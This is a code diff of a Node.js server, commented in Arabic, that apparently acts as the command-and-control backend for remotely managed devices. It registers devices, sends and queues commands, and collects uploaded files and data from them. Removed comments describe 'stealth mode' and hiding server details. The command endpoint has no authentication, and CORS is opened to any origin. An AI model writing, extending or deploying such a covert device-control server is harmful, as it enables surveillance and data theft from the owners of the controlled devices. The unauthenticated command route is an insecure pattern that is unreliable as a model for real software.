@@ -4,768 +4,744 @@ const http = require('http');
 const fs = require('fs');
 const path = require('path');
 const crypto = require('crypto');
-const cors = require('cors');
-const rateLimit = require('express-rate-limit');
 const multer = require('multer');
-const archiver = require('archiver');
+const rateLimit = require('express-rate-limit');
+const helmet = require('helmet');
+const compression = require('compression');
 
-// إعدادات الأمان والتخفي
-const SECURITY_CONFIG = {
-    enableRateLimit: true,
-    enableCORS: true,
-    enableCompression: true,
-    maxFileSize: '50mb',
-    sessionTimeout: 3600000,
-    encryptionEnabled: true,
-    stealthMode: true
-};
+class CommandServer {
+  constructor() {
+    this.app = express();
+    this.server = http.createServer(this.app);
+    this.wss = new WebSocket.Server({ server: this.server });
+    
+    this.devices = new Map();
+    this.pendingCommands = new Map();
+    this.commandHistory = [];
+    this.dataUpdates = [];
+    this.uploadedFiles = [];
+    
+    this.localStoragePath = path.join(__dirname, 'local-storage');
+    this.devicesFilePath = path.join(this.localStoragePath, 'devices.json');
+    this.commandsFilePath = path.join(this.localStoragePath, 'commands.json');
+    this.filesFilePath = path.join(this.localStoragePath, 'files.json');
+    this.dataFilePath = path.join(this.localStoragePath, 'data.json');
+    
+    this.isConnected = false;
+    this.reconnectAttempts = 0;
+    this.maxReconnectAttempts = 10;
+    this.reconnectInterval = 5000;
+    
+    this.setupMiddleware();
+    this.setupRoutes();
+    this.setupWebSocket();
+    this.setupLocalStorage();
+    this.loadPersistentData();
+    this.startBackgroundServices();
+  }
 
-const app = express();
-const server = http.createServer(app);
-
-// إعدادات التطبيق
-app.use(express.json({ limit: SECURITY_CONFIG.maxFileSize }));
-app.use(express.urlencoded({ extended: true, limit: SECURITY_CONFIG.maxFileSize }));
-
-// إعدادات CORS للتخفي
-if (SECURITY_CONFIG.enableCORS) {
-    app.use(cors({
-        origin: ['http://localhost:3000', 'https://your-domain.com'],
-        credentials: true,
-        methods: ['GET', 'POST', 'PUT', 'DELETE'],
-        allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With']
-    }));
-}
-
-// حماية من هجمات DDoS
-if (SECURITY_CONFIG.enableRateLimit) {
+  setupMiddleware() {
+    // الأمان
+    this.app.use(helmet());
+    this.app.use(compression());
+    
+    // CORS
+    this.app.use((req, res, next) => {
+      res.header('Access-Control-Allow-Origin', '*');
+      res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
+      res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
+      if (req.method === 'OPTIONS') {
+        res.sendStatus(200);
+      } else {
+        next();
+      }
+    });
+    
+    // Rate Limiting
     const limiter = rateLimit({
-        windowMs: 15 * 60 * 1000,
-        max: 200,
-        message: {
-            error: 'تم تجاوز الحد الأقصى للطلبات. يرجى المحاولة لاحقاً.'
-        },
-        standardHeaders: true,
-        legacyHeaders: false
+      windowMs: 15 * 60 * 1000, // 15 دقيقة
+      max: 100, // حد أقصى 100 طلب لكل IP
+      message: 'تم تجاوز حد الطلبات، يرجى المحاولة لاحقاً'
     });
-    app.use(limiter);
-}
-
-// إعداد WebSocket مع التخفي
-const wss = new WebSocket.Server({ 
-    server,
-    perMessageDeflate: false, // تعطيل ضغط الرسائل للتخفي
-    clientTracking: true
-});
-
-// تخزين الأجهزة المتصلة مع تشفير
-const connectedDevices = new Map();
-const deviceEncryptionKey = crypto.randomBytes(32);
-const commandHistory = new Map();
-
-// تشفير البيانات
-function encryptData(data) {
-    const iv = crypto.randomBytes(16);
-    const cipher = crypto.createCipher('aes-256-cbc', deviceEncryptionKey);
-    let encrypted = cipher.update(JSON.stringify(data), 'utf8', 'hex');
-    encrypted += cipher.final('hex');
-    return iv.toString('hex') + ':' + encrypted;
-}
-
-// فك تشفير البيانات
-function decryptData(encryptedData) {
-    try {
-        const [ivHex, encrypted] = encryptedData.split(':');
-        const iv = Buffer.from(ivHex, 'hex');
-        const decipher = crypto.createDecipher('aes-256-cbc', deviceEncryptionKey);
-        let decrypted = decipher.update(encrypted, 'hex', 'utf8');
-        decrypted += decipher.final('utf8');
-        return JSON.parse(decrypted);
-    } catch (error) {
-        return null;
-    }
-}
-
-// إعداد WebSocket
-wss.on('connection', (ws, req) => {
-    console.log('🔗 اتصال جديد من:', req.socket.remoteAddress);
+    this.app.use(limiter);
     
-    // إخفاء معلومات الخادم
-    ws._socket.setKeepAlive(true, 60000);
-    ws._socket.setNoDelay(true);
+    // JSON Parser
+    this.app.use(express.json({ limit: '10mb' }));
+    this.app.use(express.urlencoded({ extended: true, limit: '10mb' }));
     
-    ws.on('message', (message) => {
-        try {
-            const data = JSON.parse(message);
-            
-            if (data.type === 'register') {
-                handleDeviceRegistration(ws, data);
-            } else if (data.type === 'command_result') {
-                handleCommandResult(ws, data);
-            } else if (data.type === 'data_update') {
-                handleDataUpdate(ws, data);
-            } else if (data.type === 'heartbeat') {
-                handleHeartbeat(ws, data);
-            } else if (data.type === 'activation_confirmation') {
-                handleActivationConfirmation(ws, data);
-            } else if (data.type === 'file_upload') {
-                handleFileUpload(ws, data);
-            }
-        } catch (e) {
-            console.error('خطأ في معالجة الرسالة:', e);
-        }
-    });
-    
-    ws.on('close', () => {
-        handleDeviceDisconnection(ws);
-    });
-    
-    ws.on('error', (error) => {
-        console.error('خطأ في WebSocket:', error);
-        handleDeviceDisconnection(ws);
-    });
-});
-
-// معالجة تسجيل الجهاز
-function handleDeviceRegistration(ws, data) {
-    const { deviceId, activationCode, capabilities, timestamp } = data;
-    
-    // التحقق من صحة البيانات
-    if (!deviceId || !activationCode) {
-        ws.send(JSON.stringify({
-            type: 'error',
-            message: 'بيانات تسجيل غير صحيحة'
-        }));
-        return;
-    }
-    
-    // تسجيل الجهاز
-    const deviceInfo = {
-        deviceId,
-        activationCode,
-        capabilities,
-        ws,
-        status: 'connected',
-        registeredAt: timestamp || Date.now(),
-        lastSeen: Date.now(),
-        ipAddress: ws._socket.remoteAddress,
-        userAgent: ws._socket.remoteAddress // إخفاء User-Agent الحقيقي
-    };
-    
-    connectedDevices.set(deviceId, deviceInfo);
-    
-    // حفظ في قاعدة البيانات
-    saveDeviceToDatabase(deviceInfo);
-    
-    // إرسال تأكيد التسجيل
-    ws.send(JSON.stringify({
-        type: 'registration_confirmed',
-        deviceId,
-        message: 'تم التسجيل بنجاح',
-        timestamp: Date.now()
-    }));
-    
-    console.log(`✅ تم تسجيل الجهاز: ${deviceId}`);
-    
-    // إرسال إشعار للواجهة الإدارية
-    broadcastToAdmins({
-        type: 'device_connected',
-        deviceId,
-        timestamp: Date.now()
-    });
-}
-
-// معالجة نتائج الأوامر
-function handleCommandResult(ws, data) {
-    const { command, status, data: resultData, timestamp } = data;
-    
-    // حفظ في سجل الأوامر
-    const commandRecord = {
-        command,
-        status,
-        data: resultData,
-        timestamp,
-        deviceId: getDeviceIdByWebSocket(ws)
-    };
-    
-    saveCommandToHistory(commandRecord);
-    
-    // إرسال النتيجة للمشرفين
-    broadcastToAdmins({
-        type: 'command_result',
-        ...commandRecord
-    });
-    
-    console.log(`📋 نتيجة أمر: ${command} - ${status}`);
-}
-
-// معالجة تحديثات البيانات
-function handleDataUpdate(ws, data) {
-    const { dataType, data: updateData, timestamp } = data;
-    const deviceId = getDeviceIdByWebSocket(ws);
-    
-    // حفظ البيانات
-    saveDataUpdate(deviceId, dataType, updateData, timestamp);
-    
-    // إرسال للمشرفين
-    broadcastToAdmins({
-        type: 'data_update',
-        deviceId,
-        dataType,
-        data: updateData,
-        timestamp
-    });
-    
-    console.log(`📊 تحديث بيانات: ${dataType} من ${deviceId}`);
-}
-
-// معالجة نبض الحياة
-function handleHeartbeat(ws, data) {
-    const { deviceId, timestamp } = data;
-    const device = connectedDevices.get(deviceId);
-    
-    if (device) {
-        device.lastSeen = timestamp || Date.now();
-        device.status = 'connected';
-        connectedDevices.set(deviceId, device);
-        
-        // تحديث في قاعدة البيانات
-        updateDeviceStatus(deviceId, 'connected', device.lastSeen);
-    }
-}
-
-// معالجة تأكيد التفعيل
-function handleActivationConfirmation(ws, data) {
-    const { deviceId, status, timestamp } = data;
-    
-    // تحديث حالة الجهاز
-    updateDeviceStatus(deviceId, 'activated', timestamp);
-    
-    // إرسال إشعار للمشرفين
-    broadcastToAdmins({
-        type: 'device_activated',
-        deviceId,
-        timestamp
-    });
-    
-    console.log(`🎉 تم تفعيل الجهاز: ${deviceId}`);
-}
-
-// معالجة رفع الملفات
-function handleFileUpload(ws, data) {
-    const { deviceId, filename, fileData, fileType, timestamp } = data;
-    
-    try {
-        // فك تشفير بيانات الملف
-        const decryptedData = decryptData(fileData);
-        if (!decryptedData) {
-            throw new Error('فشل في فك تشفير الملف');
-        }
-        
-        // حفظ الملف
-        const uploadDir = path.join(__dirname, 'uploads', deviceId);
+    // File Upload
+    const storage = multer.diskStorage({
+      destination: (req, file, cb) => {
+        const uploadDir = path.join(this.localStoragePath, 'uploads');
         if (!fs.existsSync(uploadDir)) {
-            fs.mkdirSync(uploadDir, { recursive: true });
+          fs.mkdirSync(uploadDir, { recursive: true });
+        }
+        cb(null, uploadDir);
+      },
+      filename: (req, file, cb) => {
+        const uniqueName = `${Date.now()}-${Math.random().toString(36).substr(2, 9)}-${file.originalname}`;
+        cb(null, uniqueName);
+      }
+    });
+    
+    this.upload = multer({ 
+      storage: storage,
+      limits: {
+        fileSize: 100 * 1024 * 1024 // 100MB
+      }
+    });
+  }
+
+  setupRoutes() {
+    // إرسال أمر للجهاز
+    this.app.post('/send-command', (req, res) => {
+      try {
+        const { deviceId, command, parameters } = req.body;
+        
+        if (!deviceId || !command) {
+          return res.status(400).json({ error: 'معرف الجهاز والأمر مطلوبان' });
         }
         
-        const filePath = path.join(uploadDir, filename);
-        const fileBuffer = Buffer.from(decryptedData, 'base64');
-        
-        fs.writeFileSync(filePath, fileBuffer);
-        
-        // تسجيل في قاعدة البيانات
-        saveFileRecord(deviceId, filename, filePath, fileType, timestamp);
-        
-        // إرسال تأكيد
-        ws.send(JSON.stringify({
-            type: 'file_upload_confirmed',
-            filename,
-            status: 'success',
-            timestamp: Date.now()
-        }));
-        
-        console.log(`📁 تم رفع الملف: ${filename} من ${deviceId}`);
-        
-    } catch (error) {
-        console.error('خطأ في رفع الملف:', error);
-        ws.send(JSON.stringify({
-            type: 'file_upload_error',
-            filename,
-            error: error.message,
-            timestamp: Date.now()
-        }));
-    }
-}
-
-// معالجة انقطاع اتصال الجهاز
-function handleDeviceDisconnection(ws) {
-    const deviceId = getDeviceIdByWebSocket(ws);
-    
-    if (deviceId) {
-        const device = connectedDevices.get(deviceId);
-        if (device) {
-            device.status = 'disconnected';
-            device.lastSeen = Date.now();
-            connectedDevices.set(deviceId, device);
-            
-            // تحديث في قاعدة البيانات
-            updateDeviceStatus(deviceId, 'disconnected', device.lastSeen);
-            
-            console.log(`❌ انقطع اتصال الجهاز: ${deviceId}`);
-            
-            // إرسال إشعار للمشرفين
-            broadcastToAdmins({
-                type: 'device_disconnected',
-                deviceId,
-                timestamp: Date.now()
-            });
+        const device = this.devices.get(deviceId);
+        if (!device) {
+          // حفظ الأمر للتنفيذ لاحقاً
+          this.addPendingCommand(deviceId, command, parameters);
+          return res.json({ 
+            status: 'pending', 
+            message: 'الجهاز غير متصل، سيتم تنفيذ الأمر عند الاتصال' 
+          });
         }
-    }
-}
-
-// واجهة إرسال الأوامر
-app.post('/send-command', express.json(), (req, res) => {
-    const { deviceId, command, parameters } = req.body;
-    
-    if (!connectedDevices.has(deviceId)) {
-        return res.status(404).json({ 
-            error: 'الجهاز غير متصل',
-            deviceId,
-            timestamp: Date.now()
-        });
-    }
-    
-    try {
-        const device = connectedDevices.get(deviceId);
-        const commandId = generateCommandId();
         
-        // إنشاء الأمر المشفر
-        const encryptedCommand = encryptData({
-            action: command,
-            parameters: parameters || {},
-            commandId,
-            timestamp: Date.now()
-        });
+        const commandId = this.generateCommandId();
+        const commandData = {
+          id: commandId,
+          action: command,
+          parameters: parameters || {},
+          timestamp: Date.now()
+        };
         
         // إرسال الأمر للجهاز
-        device.ws.send(JSON.stringify({
-            type: 'command',
-            data: encryptedCommand,
-            commandId
-        }));
+        device.ws.send(JSON.stringify(commandData));
         
-        // حفظ في سجل الأوامر
-        saveCommandToHistory({
-            commandId,
-            deviceId,
-            command,
-            parameters,
-            status: 'sent',
-            timestamp: Date.now()
+        // حفظ في التاريخ
+        this.saveCommandToHistory(deviceId, command, parameters, 'sent');
+        
+        res.json({ 
+          status: 'sent', 
+          commandId: commandId,
+          message: 'تم إرسال الأمر بنجاح' 
         });
         
-        res.json({
-            success: true,
-            message: 'تم إرسال الأمر بنجاح',
-            commandId,
-            timestamp: Date.now()
-        });
-        
-        console.log(`📤 تم إرسال الأمر: ${command} إلى ${deviceId}`);
-        
-    } catch (e) {
-        console.error('خطأ في إرسال الأمر:', e);
-        res.status(500).json({ 
-            error: 'فشل في إرسال الأمر',
-            timestamp: Date.now()
-        });
-    }
-});
-
-// واجهة رفع الملفات
-const upload = multer({
-    storage: multer.diskStorage({
-        destination: (req, file, cb) => {
-            const deviceId = req.body.deviceId || 'unknown';
-            const uploadDir = path.join(__dirname, 'uploads', deviceId);
-            if (!fs.existsSync(uploadDir)) {
-                fs.mkdirSync(uploadDir, { recursive: true });
-            }
-            cb(null, uploadDir);
-        },
-        filename: (req, file, cb) => {
-            const timestamp = Date.now();
-            const filename = `${timestamp}_${file.originalname}`;
-            cb(null, filename);
-        }
-    }),
-    limits: {
-        fileSize: 50 * 1024 * 1024 // 50MB
-    }
-});
-
-app.post('/upload', upload.single('file'), (req, res) => {
-    try {
-        const { deviceId } = req.body;
-        const file = req.file;
-        
-        if (!file) {
-            return res.status(400).json({ error: 'لم يتم تحديد ملف' });
-        }
-        
-        // تسجيل الملف
-        saveFileRecord(
-            deviceId,
-            file.originalname,
-            file.path,
-            file.mimetype,
-            Date.now()
-        );
-        
-        res.json({
-            success: true,
-            message: 'تم رفع الملف بنجاح',
-            filename: file.originalname,
-            filepath: file.path,
-            timestamp: Date.now()
-        });
-        
-    } catch (error) {
-        console.error('خطأ في رفع الملف:', error);
-        res.status(500).json({ error: 'فشل في رفع الملف' });
-    }
-});
-
-// واجهة قائمة الأجهزة المتصلة
-app.get('/devices', (req, res) => {
-    try {
-        const devices = Array.from(connectedDevices.values()).map(device => ({
-            deviceId: device.deviceId,
-            status: device.status,
-            lastSeen: device.lastSeen,
-            registeredAt: device.registeredAt,
-            capabilities: device.capabilities
-        }));
-        
-        res.json({
-            success: true,
-            devices,
-            totalCount: devices.length,
-            timestamp: Date.now()
-        });
-        
-    } catch (error) {
-        console.error('خطأ في جلب قائمة الأجهزة:', error);
-        res.status(500).json({ error: 'خطأ في جلب قائمة الأجهزة' });
-    }
-});
-
-// واجهة حالة الجهاز
-app.get('/device-status/:deviceId', (req, res) => {
-    try {
-        const { deviceId } = req.params;
-        const device = connectedDevices.get(deviceId);
-        
-        if (!device) {
-            return res.status(404).json({ error: 'الجهاز غير موجود' });
-        }
-        
-        res.json({
-            success: true,
-            device: {
-                deviceId: device.deviceId,
-                status: device.status,
-                lastSeen: device.lastSeen,
-                registeredAt: device.registeredAt,
-                capabilities: device.capabilities
-            },
-            timestamp: Date.now()
-        });
-        
-    } catch (error) {
-        console.error('خطأ في جلب حالة الجهاز:', error);
-        res.status(500).json({ error: 'خطأ في جلب حالة الجهاز' });
-    }
-});
-
-// واجهة سجل الأوامر
-app.get('/command-history/:deviceId', (req, res) => {
-    try {
-        const { deviceId } = req.params;
-        const history = commandHistory.get(deviceId) || [];
-        
-        res.json({
-            success: true,
-            history,
-            totalCount: history.length,
-            timestamp: Date.now()
-        });
-        
-    } catch (error) {
-        console.error('خطأ في جلب سجل الأوامر:', error);
-        res.status(500).json({ error: 'خطأ في جلب سجل الأوامر' });
-    }
-});
-
-// واجهة تحميل الملفات
-app.get('/download/:deviceId/:filename', (req, res) => {
-    try {
-        const { deviceId, filename } = req.params;
-        const filePath = path.join(__dirname, 'uploads', deviceId, filename);
-        
-        if (!fs.existsSync(filePath)) {
-            return res.status(404).json({ error: 'الملف غير موجود' });
-        }
-        
-        res.download(filePath, filename);
-        
-    } catch (error) {
-        console.error('خطأ في تحميل الملف:', error);
-        res.status(500).json({ error: 'خطأ في تحميل الملف' });
-    }
-});
-
-// واجهة حذف الجهاز
-app.delete('/device/:deviceId', (req, res) => {
-    try {
-        const { deviceId } = req.params;
-        
-        if (connectedDevices.has(deviceId)) {
-            const device = connectedDevices.get(deviceId);
-            device.ws.close();
-            connectedDevices.delete(deviceId);
-            
-            // حذف من قاعدة البيانات
-            deleteDeviceFromDatabase(deviceId);
-            
-            res.json({
-                success: true,
-                message: 'تم حذف الجهاز بنجاح',
-                timestamp: Date.now()
-            });
-        } else {
-            res.status(404).json({ error: 'الجهاز غير موجود' });
-        }
-        
-    } catch (error) {
-        console.error('خطأ في حذف الجهاز:', error);
-        res.status(500).json({ error: 'خطأ في حذف الجهاز' });
-    }
-});
-
-// واجهة إحصائيات النظام
-app.get('/stats', (req, res) => {
-    try {
-        const stats = {
-            totalDevices: connectedDevices.size,
-            activeDevices: Array.from(connectedDevices.values()).filter(d => d.status === 'connected').length,
-            totalCommands: Array.from(commandHistory.values()).flat().length,
-            systemUptime: process.uptime(),
-            memoryUsage: process.memoryUsage(),
-            timestamp: Date.now()
-        };
-        
-        res.json({
-            success: true,
-            stats
-        });
-        
-    } catch (error) {
-        console.error('خطأ في جلب الإحصائيات:', error);
-        res.status(500).json({ error: 'خطأ في جلب الإحصائيات' });
-    }
-});
-
-// وظائف مساعدة
-function getDeviceIdByWebSocket(ws) {
-    for (const [deviceId, device] of connectedDevices.entries()) {
-        if (device.ws === ws) {
-            return deviceId;
-        }
-    }
-    return null;
-}
-
-function generateCommandId() {
-    return 'CMD-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
-}
-
-function broadcastToAdmins(data) {
-    // إرسال للمشرفين المتصلين
-    wss.clients.forEach(client => {
-        if (client.isAdmin) {
-            client.send(JSON.stringify(data));
-        }
+      } catch (error) {
+        console.error('خطأ في إرسال الأمر:', error);
+        res.status(500).json({ error: 'خطأ داخلي في الخادم' });
+      }
     });
-}
-
-function saveDeviceToDatabase(deviceInfo) {
-    try {
-        const devicesFile = path.join(__dirname, 'data', 'devices.json');
-        let devices = [];
-        
-        if (fs.existsSync(devicesFile)) {
-            devices = JSON.parse(fs.readFileSync(devicesFile, 'utf8'));
-        }
-        
-        const existingIndex = devices.findIndex(d => d.deviceId === deviceInfo.deviceId);
-        if (existingIndex >= 0) {
-            devices[existingIndex] = deviceInfo;
-        } else {
-            devices.push(deviceInfo);
-        }
-        
-        fs.writeFileSync(devicesFile, JSON.stringify(devices, null, 2));
-    } catch (error) {
-        console.error('خطأ في حفظ الجهاز:', error);
-    }
-}
-
-function updateDeviceStatus(deviceId, status, timestamp) {
-    try {
-        const devicesFile = path.join(__dirname, 'data', 'devices.json');
-        if (fs.existsSync(devicesFile)) {
-            let devices = JSON.parse(fs.readFileSync(devicesFile, 'utf8'));
-            const device = devices.find(d => d.deviceId === deviceId);
-            if (device) {
-                device.status = status;
-                device.lastSeen = timestamp;
-                fs.writeFileSync(devicesFile, JSON.stringify(devices, null, 2));
-            }
-        }
-    } catch (error) {
-        console.error('خطأ في تحديث حالة الجهاز:', error);
-    }
-}
-
-function saveCommandToHistory(commandRecord) {
-    try {
-        const { deviceId } = commandRecord;
-        if (!commandHistory.has(deviceId)) {
-            commandHistory.set(deviceId, []);
-        }
-        
-        const history = commandHistory.get(deviceId);
-        history.push(commandRecord);
-        
-        // الاحتفاظ بآخر 100 أمر فقط
-        if (history.length > 100) {
-            history.shift();
-        }
-        
-        commandHistory.set(deviceId, history);
-    } catch (error) {
-        console.error('خطأ في حفظ سجل الأمر:', error);
-    }
-}
-
-function saveDataUpdate(deviceId, dataType, data, timestamp) {
-    try {
-        const dataFile = path.join(__dirname, 'data', `${deviceId}_${dataType}.json`);
-        const dataRecord = {
-            deviceId,
-            dataType,
-            data,
-            timestamp
-        };
-        
-        let dataHistory = [];
-        if (fs.existsSync(dataFile)) {
-            dataHistory = JSON.parse(fs.readFileSync(dataFile, 'utf8'));
-        }
-        
-        dataHistory.push(dataRecord);
-        
-        // الاحتفاظ بآخر 1000 سجل فقط
-        if (dataHistory.length > 1000) {
-            dataHistory = dataHistory.slice(-1000);
-        }
-        
-        fs.writeFileSync(dataFile, JSON.stringify(dataHistory, null, 2));
-    } catch (error) {
-        console.error('خطأ في حفظ تحديث البيانات:', error);
-    }
-}
-
-function saveFileRecord(deviceId, filename, filepath, fileType, timestamp) {
-    try {
-        const filesFile = path.join(__dirname, 'data', 'files.json');
-        let files = [];
-        
-        if (fs.existsSync(filesFile)) {
-            files = JSON.parse(fs.readFileSync(filesFile, 'utf8'));
+    
+    // حالة الجهاز
+    this.app.get('/device-status/:deviceId', (req, res) => {
+      const { deviceId } = req.params;
+      const device = this.devices.get(deviceId);
+      
+      if (!device) {
+        return res.status(404).json({ error: 'الجهاز غير موجود' });
+      }
+      
+      res.json({
+        deviceId: deviceId,
+        status: device.status,
+        lastSeen: device.lastSeen,
+        deviceInfo: device.deviceInfo,
+        capabilities: device.capabilities
+      });
+    });
+    
+    // قائمة الأجهزة المتصلة
+    this.app.get('/devices', (req, res) => {
+      const devicesList = Array.from(this.devices.entries()).map(([deviceId, device]) => ({
+        deviceId,
+        status: device.status,
+        lastSeen: device.lastSeen,
+        deviceInfo: device.deviceInfo,
+        capabilities: device.capabilities
+      }));
+      
+      res.json({
+        total: devicesList.length,
+        devices: devicesList
+      });
+    });
+    
+    // رفع ملف
+    this.app.post('/upload', this.upload.single('file'), (req, res) => {
+      try {
+        if (!req.file) {
+          return res.status(400).json({ error: 'لم يتم تحديد ملف' });
         }
         
         const fileRecord = {
-            deviceId,
-            filename,
-            filepath,
-            fileType,
-            uploadDate: timestamp,
-            fileSize: fs.statSync(filepath).size
+          id: this.generateCommandId(),
+          originalName: req.file.originalname,
+          filename: req.file.filename,
+          path: req.file.path,
+          size: req.file.size,
+          mimetype: req.file.mimetype,
+          uploadDate: new Date(),
+          deviceId: req.body.deviceId || 'unknown'
         };
         
-        files.push(fileRecord);
-        fs.writeFileSync(filesFile, JSON.stringify(files, null, 2));
-    } catch (error) {
-        console.error('خطأ في حفظ سجل الملف:', error);
-    }
-}
-
-function deleteDeviceFromDatabase(deviceId) {
-    try {
-        const devicesFile = path.join(__dirname, 'data', 'devices.json');
-        if (fs.existsSync(devicesFile)) {
-            let devices = JSON.parse(fs.readFileSync(devicesFile, 'utf8'));
-            devices = devices.filter(d => d.deviceId !== deviceId);
-            fs.writeFileSync(devicesFile, JSON.stringify(devices, null, 2));
-        }
-    } catch (error) {
-        console.error('خطأ في حذف الجهاز من قاعدة البيانات:', error);
-    }
-}
-
-// إنشاء المجلدات المطلوبة
-function createRequiredDirectories() {
-    const directories = [
-        path.join(__dirname, 'data'),
-        path.join(__dirname, 'uploads'),
-        path.join(__dirname, 'logs')
-    ];
-    
-    directories.forEach(dir => {
-        if (!fs.existsSync(dir)) {
-            fs.mkdirSync(dir, { recursive: true });
-        }
+        this.uploadedFiles.push(fileRecord);
+        this.saveFileRecord(fileRecord);
+        
+        res.json({
+          status: 'success',
+          fileId: fileRecord.id,
+          message: 'تم رفع الملف بنجاح'
+        });
+        
+      } catch (error) {
+        console.error('خطأ في رفع الملف:', error);
+        res.status(500).json({ error: 'خطأ في رفع الملف' });
+      }
     });
-}
-
-// تنظيف دوري للأجهزة غير النشطة
-function cleanupInactiveDevices() {
-    const now = Date.now();
-    const inactiveThreshold = 30 * 60 * 1000; // 30 دقيقة
     
-    for (const [deviceId, device] of connectedDevices.entries()) {
-        if (now - device.lastSeen > inactiveThreshold) {
-            device.ws.close();
-            connectedDevices.delete(deviceId);
-            console.log(`🧹 تم تنظيف الجهاز غير النشط: ${deviceId}`);
+    // تأكيد التفعيل
+    this.app.post('/activation-confirmation', (req, res) => {
+      try {
+        const activationData = req.body;
+        
+        // حفظ بيانات التفعيل
+        this.saveActivationData(activationData);
+        
+        // إرسال الأوامر المعلقة إذا كان الجهاز متصل
+        const device = this.devices.get(activationData.deviceId);
+        if (device) {
+          this.sendPendingCommands(activationData.deviceId);
         }
+        
+        res.json({ status: 'success', message: 'تم تأكيد التفعيل' });
+        
+      } catch (error) {
+        console.error('خطأ في تأكيد التفعيل:', error);
+        res.status(500).json({ error: 'خطأ في تأكيد التفعيل' });
+      }
+    });
+    
+    // إحصائيات النظام
+    this.app.get('/stats', (req, res) => {
+      const stats = {
+        connectedDevices: this.devices.size,
+        pendingCommands: this.pendingCommands.size,
+        totalCommands: this.commandHistory.length,
+        totalFiles: this.uploadedFiles.length,
+        totalDataUpdates: this.dataUpdates.length,
+        uptime: process.uptime(),
+        memory: process.memoryUsage(),
+        timestamp: Date.now()
+      };
+      
+      res.json(stats);
+    });
+    
+    // تنظيف البيانات القديمة
+    this.app.post('/cleanup', (req, res) => {
+      try {
+        this.cleanupOldData();
+        res.json({ status: 'success', message: 'تم تنظيف البيانات القديمة' });
+      } catch (error) {
+        console.error('خطأ في التنظيف:', error);
+        res.status(500).json({ error: 'خطأ في التنظيف' });
+      }
+    });
+  }
+
+  setupWebSocket() {
+    this.wss.on('connection', (ws, req) => {
+      console.log('تم الاتصال بجهاز جديد');
+      
+      let deviceId = null;
+      
+      ws.on('message', (data) => {
+        try {
+          const message = JSON.parse(data);
+          
+          switch (message.type) {
+            case 'register':
+              deviceId = message.deviceId;
+              this.handleDeviceRegistration(ws, message);
+              break;
+              
+            case 'command_result':
+              this.handleCommandResult(message);
+              break;
+              
+            case 'data_update':
+              this.handleDataUpdate(message);
+              break;
+              
+            case 'heartbeat':
+              this.handleHeartbeat(message);
+              break;
+              
+            case 'activation_confirmation':
+              this.handleActivationConfirmation(message);
+              break;
+              
+            case 'pending_command_result':
+              this.handlePendingCommandResult(message);
+              break;
+              
+            case 'cached_data':
+              this.handleCachedData(message);
+              break;
+              
+            default:
+              console.log('رسالة غير معروفة:', message.type);
+          }
+          
+        } catch (error) {
+          console.error('خطأ في معالجة الرسالة:', error);
+        }
+      });
+      
+      ws.on('close', () => {
+        if (deviceId) {
+          this.handleDeviceDisconnection(deviceId);
+        }
+      });
+      
+      ws.on('error', (error) => {
+        console.error('خطأ في WebSocket:', error);
+        if (deviceId) {
+          this.handleDeviceDisconnection(deviceId);
+        }
+      });
+    });
+  }
+
+  setupLocalStorage() {
+    if (!fs.existsSync(this.localStoragePath)) {
+      fs.mkdirSync(this.localStoragePath, { recursive: true });
     }
+  }
+
+  loadPersistentData() {
+    try {
+      // تحميل الأجهزة
+      if (fs.existsSync(this.devicesFilePath)) {
+        const devicesData = JSON.parse(fs.readFileSync(this.devicesFilePath, 'utf8'));
+        devicesData.forEach(device => {
+          this.devices.set(device.deviceId, {
+            ...device,
+            ws: null, // إعادة تعيين WebSocket
+            status: 'offline'
+          });
+        });
+      }
+      
+      // تحميل الأوامر المعلقة
+      if (fs.existsSync(this.commandsFilePath)) {
+        const commandsData = JSON.parse(fs.readFileSync(this.commandsFilePath, 'utf8'));
+        commandsData.forEach(cmd => {
+          if (!this.pendingCommands.has(cmd.deviceId)) {
+            this.pendingCommands.set(cmd.deviceId, []);
+          }
+          this.pendingCommands.get(cmd.deviceId).push(cmd);
+        });
+      }
+      
+      // تحميل الملفات
+      if (fs.existsSync(this.filesFilePath)) {
+        this.uploadedFiles = JSON.parse(fs.readFileSync(this.filesFilePath, 'utf8'));
+      }
+      
+      // تحميل البيانات
+      if (fs.existsSync(this.dataFilePath)) {
+        this.dataUpdates = JSON.parse(fs.readFileSync(this.dataFilePath, 'utf8'));
+      }
+      
+      console.log('تم تحميل البيانات المحلية بنجاح');
+      
+    } catch (error) {
+      console.error('خطأ في تحميل البيانات المحلية:', error);
+    }
+  }
+
+  startBackgroundServices() {
+    // حفظ البيانات كل 5 دقائق
+    setInterval(() => {
+      this.savePersistentData();
+    }, 300000);
+    
+    // تنظيف البيانات القديمة كل ساعة
+    setInterval(() => {
+      this.cleanupOldData();
+    }, 3600000);
+    
+    // فحص الأجهزة غير النشطة كل 10 دقائق
+    setInterval(() => {
+      this.cleanupInactiveDevices();
+    }, 600000);
+    
+    // إرسال الأوامر المعلقة كل دقيقة
+    setInterval(() => {
+      this.processPendingCommands();
+    }, 60000);
+  }
+
+  handleDeviceRegistration(ws, message) {
+    const { deviceId, capabilities, timestamp, status } = message;
+    
+    const device = {
+      ws: ws,
+      deviceId: deviceId,
+      status: status || 'online',
+      lastSeen: new Date(),
+      deviceInfo: message.deviceInfo || {},
+      capabilities: capabilities || {},
+      timestamp: timestamp
+    };
+    
+    this.devices.set(deviceId, device);
+    this.saveDeviceToDatabase(device);
+    
+    console.log(`تم تسجيل الجهاز: ${deviceId}`);
+    
+    // إرسال الأوامر المعلقة
+    this.sendPendingCommands(deviceId);
+  }
+
+  handleCommandResult(message) {
+    const { commandId, action, status, result, error, timestamp } = message;
+    
+    // تحديث التاريخ
+    this.updateCommandInHistory(commandId, status, result, error);
+    
+    console.log(`نتيجة الأمر ${action}: ${status}`);
+    
+    if (error) {
+      console.error(`خطأ في الأمر ${action}:`, error);
+    }
+  }
+
+  handleDataUpdate(message) {
+    const { deviceId, dataType, data, timestamp } = message;
+    
+    const dataUpdate = {
+      id: this.generateCommandId(),
+      deviceId: deviceId,
+      dataType: dataType,
+      data: data,
+      timestamp: timestamp || Date.now()
+    };
+    
+    this.dataUpdates.push(dataUpdate);
+    this.saveDataUpdate(dataUpdate);
+    
+    console.log(`تحديث بيانات من ${deviceId}: ${dataType}`);
+  }
+
+  handleHeartbeat(message) {
+    const { deviceId, timestamp } = message;
+    const device = this.devices.get(deviceId);
